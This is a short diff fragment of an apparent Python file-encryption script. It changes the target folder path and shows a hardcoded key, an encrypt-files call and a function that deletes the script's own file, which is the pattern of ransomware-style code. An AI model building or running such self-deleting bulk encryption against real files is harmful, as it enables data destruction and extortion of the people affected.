@@ -16,7 +16,7 @@ def encrypt_files(path, key):
 def delete_script():
     os.remove(__file__)
 
-path = r'C:\share C\vscode\K\test'
+path = r'C:\share C\vscode\Pass\test'
 key = b'gQHAjOvQ8tUkqHqrfwXs8uVwdsgLmItRH4JZ2xz18l0='
 
 encrypt_files(path, key)
